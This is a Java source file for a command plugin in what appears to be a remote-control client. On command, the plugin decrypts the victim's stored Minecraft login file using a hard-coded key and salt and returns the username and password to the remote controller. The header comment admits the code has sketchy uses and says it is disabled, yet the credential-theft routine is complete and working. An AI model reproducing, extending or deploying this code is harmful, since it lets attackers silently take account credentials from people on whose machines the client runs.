package casper.client.commands.impl;

import casper.client.Client;
import casper.client.commands.Action;
import casper.client.commands.Command;
import casper.net.json.JSONArray;
import casper.net.json.JSONException;
import casper.net.Packet;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Random;

/**
 * The first plugin ever created by another user. It checks to see if the client plays Minecraft,
 * if they do, you can have it access the recovery function to decrypt the information stored in
 * the account file. I see some sketchy uses fort his file, so I have commented it out from being
 * initialized in the Client class.
 *
 * @author Kieran
 * @version 1.1
 */
@Command("minecraft")
public class Minecraft implements Action {

    /**
     * Implemented from the Action interface.
     *
     * @param client The client that issued the command.
     * @param p      The packet read by the client.
     */
    public void execute(Client client, Packet p) throws JSONException {
        JSONArray params = p.readJSONArray();
        if (params.length() > 0) {
            String arg = params.getString(0);
            if (arg.toLowerCase().contains("read") && isPlayer()) {
                String accountInfo = decode();
                client.print("Minecraft: " + accountInfo);
                return;
            }
        }
        client.print("I am" + (isPlayer() ? " " : " not ") + "a Minecraft player");
    }

    /**
     * Checks to see if the client is a Minecraft player.
     *
     * @return if the client is a player.
     */
    private boolean isPlayer() {
        String path = System.getenv("APPDATA") + "\\.minecraft\\lastlogin";
        File passFile = new File(path);
        return passFile.exists();
    }

    /**
     * Attempts to recover the Minecraft information.
     *
     * @return The minecraft account information.
     */
    private String decode() {
        try {
            Random random = new Random(43287234L);
            byte[] salt = new byte[8];
            random.nextBytes(salt);
            PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 5);
            SecretKey pbeKey = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(
                    new PBEKeySpec("passwordfile".toCharArray()));
            Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
            cipher.init(2, pbeKey, pbeParamSpec);
            String path = System.getenv("APPDATA") + "\\.minecraft\\lastlogin";
            File passFile = new File(path);
            DataInputStream dis;
            dis = new DataInputStream(new CipherInputStream(new FileInputStream(passFile), cipher));
            String user = dis.readUTF();
            String pass = dis.readUTF();
            dis.close();
            return user + ":" + pass;

        } catch (Exception ignored) {
        }
        return "Unknown";
    }

}